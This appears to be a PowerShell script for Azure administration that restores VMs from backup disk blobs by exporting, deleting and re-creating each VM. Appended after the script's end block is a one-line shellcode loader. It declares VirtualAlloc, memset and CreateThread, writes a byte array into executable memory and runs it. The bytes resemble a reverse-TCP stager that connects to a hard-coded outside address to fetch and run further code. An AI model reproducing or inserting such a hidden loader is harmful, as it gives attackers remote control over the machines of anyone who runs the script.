
[CmdletBinding()]
param (
	[Parameter(Mandatory,
			   ValueFromPipeline)]
	[string[]]$AzureVM,
	[string]$ServiceName = 'ADBCLOUD',
	[string]$VmExportConfigFolderPath = 'C:\ExportedVMs'
)

begin {
	Set-StrictMode -Version Latest
	try {
		
		$AzureModuleFilePath = "$($env:ProgramFiles)\Microsoft SDKs\Windows Azure\PowerShell\ServiceManagement\Azure\Azure.psd1"
		if (!(Test-Path $AzureModuleFilePath)) {
			Write-Error 'Azure module not found'
		} else {
			Import-Module $AzureModuleFilePath
		}
		
		$script:BackupContainer = 'backups'
		
		
		if (!(Test-Path $VmExportConfigFolderPath -PathType Container)) {
			New-Item -Path $VmExportConfigFolderPath -ItemType Directory | Out-Null
		}
		
		function Restore-Snapshot([Microsoft.WindowsAzure.Commands.ServiceManagement.Model.PersistentVMModel.OSVirtualHardDisk]$Disk) {
			$DiskName = $Disk.DiskName
			$DiskUris = $Disk.MediaLink
			$StorageAccount = $DiskUris.Host.Split('.')[0]
			$Blob = $Disk.MediaLink.Segments[-1]
			$Container = $Disk.MediaLink.Segments[-2].TrimEnd('/')
			
			While ((Get-AzureDisk -DiskName $DiskName).AttachedTo) {
				Write-Verbose "Waiting for $DiskName to detach..."
				Start-Sleep 5
			}
			Remove-AzureDisk -DiskName $DiskName -DeleteVHD
			
			$BlobCopyParams = @{
				'SrcContainer' = $BackupContainer;
				'SrcBlob' = $Blob;
				'DestContainer' = $Container;
				'Force' = $true
			}
			Start-AzureStorageBlobCopy @BlobCopyParams
			Get-AzureStorageBlobCopyState -Container $Container -Blob $Blob -WaitForComplete
			Add-AzureDisk -DiskName $DiskName -MediaLocation $DiskUris.AbsoluteUri -OS 'Windows'
		}
		
	} catch {
		Write-Error $_.Exception.Message
		exit
	}
}

process {
	try {
		foreach ($Vm in $AzureVM) {
			$Vm = Get-AzureVM -ServiceName $ServiceName -Name $Vm
			if ($Vm.Status -ne 'StoppedVM') {
				if ($Vm.Status -eq 'ReadyRole') {
					Write-Verbose "VM $($Vm.Name) is started.  Bringing down into a provisioned state"
					
					$Vm | Stop-AzureVm -StayProvisioned
				} elseif ($Vm.Status -eq 'StoppedDeallocated') {
					Write-Verbose "VM $($Vm.Name) is stopped but not in a provisioned state."
					
					Write-Verbose "Starting up VM $($Vm.Name)..."
					$Vm | Start-AzureVm
					while ((Get-AzureVm -ServiceName $ServiceName -Name $Vm.Name).Status -ne 'ReadyRole') {
						sleep 5
						Write-Verbose "Waiting on VM $($Vm.Name) to be in a ReadyRole state..."
					}
					Write-Verbose "VM $($Vm.Name) now up.  Bringing down into a provisioned state..."
					$Vm | Stop-AzureVm -StayProvisioned
				}
				
			}
			
			$OsDisk = $Vm | Get-AzureOSDisk
			
			
			$VmExportPath = "$VmExportConfigFolderPath\$($Vm.Name).xml"
			$Vm | Export-AzureVM -Path $VmExportPath
			
			
			Remove-AzureVM -ServiceName $Vm.ServiceName -Name $Vm.Name
			
			
			Restore-Snapshot -Disk $OsDisk
			
			
			$DataDisks = $Vm | Get-AzureDataDisk
			if ($DataDisks) {
				Write-Verbose "Data disks found on VM.  Restoring..."
				foreach ($DataDisk in $DataDisks) {
					Restore-Snapshot -Disk $DataDisk
				}
			}
			
			Import-AzureVM -Path $VmExportPath | New-AzureVM -ServiceName $Vm.ServiceName
			While ((Get-AzureVM -Name $Vm.Name).Status -ne 'ReadyRole') {
				Write-Verbose "Waiting for $($Vm.Name) to become available again..."
				Start-Sleep 5
			}
		}
	} catch {
		Write-Error $_.Exception.Message
		exit
	}
}

end {
	try {
		
	} catch {
		Write-Error $_.Exception.Message
	}
}
$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x82,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf2,0x52,0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,0x01,0xd1,0x51,0x8b,0x59,0x20,0x01,0xd3,0x8b,0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf6,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,0x8d,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0x53,0x37,0x86,0xdc,0x68,0x02,0x00,0x15,0xc1,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0a,0xff,0x4e,0x08,0x75,0xec,0xe8,0x3f,0x00,0x00,0x00,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7e,0xe9,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7e,0xc3,0x01,0xc3,0x29,0xc6,0x75,0xe9,0xc3,0xbb,0xf0,0xb5,0xa2,0x56,0x6a,0x00,0x53,0xff,0xd5;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

